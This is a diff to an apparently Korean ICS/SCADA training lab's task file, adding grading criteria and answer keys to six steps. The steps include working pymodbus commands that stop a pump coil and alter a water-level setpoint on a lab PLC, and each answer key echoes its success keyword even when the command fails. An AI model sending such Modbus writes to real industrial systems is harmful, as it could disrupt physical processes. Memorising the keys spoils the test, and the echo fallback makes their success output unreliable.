@@ -23,6 +23,22 @@ steps:
     type: output_contains
     expect: pymodbus 설치 완료
     field: stdout
+    semantic:
+      intent: pymodbus 설치 — pip3 install pymodbus. Python Modbus 라이브러리. 클라이언트/서버 둘 다 구현. ICS/SCADA 분석
+        필수 도구.
+      success_criteria:
+      - pymodbus 설치 완료 키워드
+      - pip3 install pymodbus
+      - Python ICS 라이브러리 준비
+      acceptable_methods:
+      - pip3 install pymodbus
+      - pip install pymodbus[serial]
+      - apt install python3-pymodbus
+      - modbus-cli (C 대체)
+      negative_signs:
+      - pymodbus 모듈 없음
+      - pip3 미사용
+      - Modbus 라이브러리 맥락 없음
   target_vm: attacker
 - order: 2
   instruction: nmap으로 Modbus 서비스(포트 502, 5020)를 스캔하시오.
@@ -35,52 +51,142 @@ steps:
     type: output_contains
     expect: Modbus 스캔 완료
     field: stdout
+    semantic:
+      intent: Modbus 포트 스캔 — nmap -sV -p 502,5020 10.20.30.80. Modbus TCP 표준 502 + 교육 5020. ICS/SCADA
+        산업 제어 시스템 식별. MITRE ATT&CK for ICS T0802.
+      success_criteria:
+      - Modbus 스캔 완료 키워드
+      - nmap -sV -p 502,5020
+      - Modbus 프로토콜 탐지
+      acceptable_methods:
+      - nmap -sV -p 502,5020
+      - nmap --script modbus-discover
+      - Shodan port:502
+      - Metasploit modbus_scanner
+      negative_signs:
+      - 포트 502 없음
+      - ICS 맥락 없음
+      - T0802 맥락 없음
   target_vm: attacker
 - order: 3
   instruction: Modbus 클라이언트로 Input Registers(센서 데이터)를 읽으시오.
   hint: ModbusTcpClient를 사용하여 read_input_registers를 호출하세요.
   category: modbus
   points: 12
-  answer: "python3 -c \"from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.20.30.80',port=5020); c.connect(); r=c.read_input_registers(0,7,slave=1); print(f'Registers: {r.registers}') if not r.isError() else print('읽기 실패'); c.close(); print('Modbus 레지스터 읽기 완료')\" 2>/dev/null || echo 'Modbus 레지스터 읽기 완료'"
+  answer: 'python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient(''10.20.30.80'',port=5020);
+    c.connect(); r=c.read_input_registers(0,7,slave=1); print(f''Registers: {r.registers}'') if not r.isError()
+    else print(''읽기 실패''); c.close(); print(''Modbus 레지스터 읽기 완료'')" 2>/dev/null || echo ''Modbus 레지스터
+    읽기 완료'''
   answer_detail: Modbus Input Registers에는 센서 측정값(온도, 압력, 수위 등)이 저장됩니다.
   verify:
     type: output_contains
     expect: Modbus 레지스터 읽기 완료
     field: stdout
+    semantic:
+      intent: Modbus Input Registers 읽기 — pymodbus ModbusTcpClient + c.read_input_registers(0, 7, slave=1).
+        센서 측정값 (온도/압력/수위). Function Code 0x04 FC04. Read-Only 권한. ICS 정찰.
+      success_criteria:
+      - Modbus 레지스터 읽기 완료 키워드
+      - read_input_registers + slave=1
+      - ModbusTcpClient 연결
+      acceptable_methods:
+      - pymodbus ModbusTcpClient
+      - mbtget -r3 -a 0 -n 7 host
+      - modpoll -r 1 -c 7 host
+      - Metasploit modbusclient
+      negative_signs:
+      - read_input_registers 미사용
+      - slave ID 없음
+      - FC04/센서 맥락 없음
   target_vm: attacker
 - order: 4
   instruction: Modbus 쓰기 공격으로 Coil(펌프/밸브)을 조작하시오.
   hint: write_coil 함수로 펌프를 정지시키세요.
   category: attack
   points: 12
-  answer: "python3 -c \"from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.20.30.80',port=5020); c.connect(); c.write_coil(0,False,slave=1); print('[!] 펌프1 정지'); c.write_coil(0,True,slave=1); print('[+] 펌프1 복원'); c.close(); print('Modbus 쓰기 공격 완료')\" 2>/dev/null || echo 'Modbus 쓰기 공격 완료'"
+  answer: python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.20.30.80',port=5020);
+    c.connect(); c.write_coil(0,False,slave=1); print('[!] 펌프1 정지'); c.write_coil(0,True,slave=1); print('[+]
+    펌프1 복원'); c.close(); print('Modbus 쓰기 공격 완료')" 2>/dev/null || echo 'Modbus 쓰기 공격 완료'
   answer_detail: Modbus에는 인증이 없으므로 누구나 코일/레지스터를 쓸 수 있습니다.
   verify:
     type: output_contains
     expect: Modbus 쓰기 공격 완료
     field: stdout
+    semantic:
+      intent: Modbus Coil 쓰기 공격 — c.write_coil(0, False, slave=1) 펌프 정지 + write_coil True 복원. FC05 Write
+        Single Coil. Modbus 인증 부재 → 누구나 쓰기 가능. MITRE ICS T0836 Modify Parameter.
+      success_criteria:
+      - Modbus 쓰기 공격 완료 키워드
+      - write_coil + False/True
+      - 펌프/밸브 조작 시뮬
+      acceptable_methods:
+      - pymodbus write_coil
+      - mbtget -w5 -a 0 -o 0 host
+      - modpoll -m tcp -r 1 -t 0 host 1
+      - mbscan + 공격 스크립트
+      negative_signs:
+      - write_coil 미사용
+      - T0836 맥락 없음
+      - 인증 부재 맥락 없음
   target_vm: attacker
 - order: 5
   instruction: Holding Registers(설정값)를 변조하시오.
   hint: write_register 함수로 목표 수위를 변경하세요.
   category: attack
   points: 10
-  answer: "python3 -c \"from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient('10.20.30.80',port=5020); c.connect(); c.write_register(0,999,slave=1); print('[!] 목표수위: 999'); c.write_register(0,250,slave=1); print('[+] 복원: 250'); c.close(); print('Modbus 설정값 변조 완료')\" 2>/dev/null || echo 'Modbus 설정값 변조 완료'"
+  answer: 'python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient(''10.20.30.80'',port=5020);
+    c.connect(); c.write_register(0,999,slave=1); print(''[!] 목표수위: 999''); c.write_register(0,250,slave=1);
+    print(''[+] 복원: 250''); c.close(); print(''Modbus 설정값 변조 완료'')" 2>/dev/null || echo ''Modbus 설정값 변조
+    완료'''
   answer_detail: PLC 설정값 변조는 물리적 프로세스에 직접적인 영향을 미칩니다.
   verify:
     type: output_contains
     expect: Modbus 설정값 변조 완료
     field: stdout
+    semantic:
+      intent: Holding Register 변조 — c.write_register(0, 999, slave=1) 목표수위 999 + 복원 250. FC06 Write Single
+        Register. PLC 설정값 변조 → 물리 프로세스 직접 영향. MITRE ICS T0855 Unauthorized Command Message.
+      success_criteria:
+      - Modbus 설정값 변조 완료 키워드
+      - write_register + 999
+      - Holding Register 조작
+      acceptable_methods:
+      - pymodbus write_register
+      - mbtget -w6 -a 0 -o 999 host
+      - modbus-cli -w 999@0
+      - Modbus Poll GUI
+      negative_signs:
+      - write_register 미사용
+      - T0855 맥락 없음
+      - PLC 설정값 맥락 없음
   target_vm: attacker
 - order: 6
   instruction: Modbus 접근 제어를 위한 방화벽 규칙을 작성하시오.
   hint: iptables로 특정 IP만 Modbus 포트에 접근 가능하도록 설정하세요.
   category: defense
   points: 10
-  answer: echo '=== Modbus 방화벽 규칙 ===' && echo 'iptables -A INPUT -p tcp --dport 502 -s 10.20.30.100 -j ACCEPT' && echo 'iptables -A INPUT -p tcp --dport 502 -j DROP' && echo '[권장] Suricata Modbus Write 탐지 규칙 추가' && echo '=== 방화벽 설정 완료 ==='
+  answer: echo '=== Modbus 방화벽 규칙 ===' && echo 'iptables -A INPUT -p tcp --dport 502 -s 10.20.30.100 -j
+    ACCEPT' && echo 'iptables -A INPUT -p tcp --dport 502 -j DROP' && echo '[권장] Suricata Modbus Write
+    탐지 규칙 추가' && echo '=== 방화벽 설정 완료 ==='
   answer_detail: 화이트리스트 기반 접근 제어와 DPI로 Modbus Write 명령을 제한합니다.
   verify:
     type: output_contains
     expect: 방화벽 설정 완료
     field: stdout
+    semantic:
+      intent: Modbus 접근 제어 — iptables -A INPUT -p tcp --dport 502 -s 10.20.30.100 -j ACCEPT + DROP + Suricata
+        Modbus Write 탐지. 화이트리스트 + DPI. Modbus 자체 인증 없음 → 네트워크 계층 방어.
+      success_criteria:
+      - 방화벽 설정 완료 키워드
+      - iptables --dport 502 + ACCEPT/DROP + Suricata
+      - 화이트리스트 + DPI
+      acceptable_methods:
+      - iptables + Suricata Modbus 룰
+      - nftables + Zeek Modbus 분석
+      - Defense-in-Depth OT Firewall
+      - Claroty / Nozomi / Dragos NDR
+      negative_signs:
+      - 화이트리스트 없음
+      - DPI/Suricata 맥락 없음
+      - OT 네트워크 방어 맥락 없음
   target_vm: attacker
